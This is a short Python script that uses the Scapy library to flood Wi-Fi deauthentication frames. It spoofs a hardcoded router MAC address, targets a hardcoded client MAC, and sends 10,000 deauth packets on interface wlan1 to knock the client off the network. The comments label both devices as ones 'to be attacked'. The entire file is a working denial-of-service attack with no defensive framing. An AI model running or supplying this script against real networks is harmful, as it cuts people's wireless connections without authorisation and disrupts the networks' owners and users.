#!/usr/bin/env python3.9
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth

brdmac = "ff:ff:ff:ff:ff:ff"

target_mac = "70:5e:55:bc:86:0f"  # Mac id of client to be attacked

gateway_mac = "c0:4a:00:33:3b:62"  # Mac id of router to be attacked

dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

pkt = RadioTap() / dot11 / Dot11Deauth(reason=15)

sendp(pkt, inter=0.5, iface="wlan1", count=10000, verbose=1)
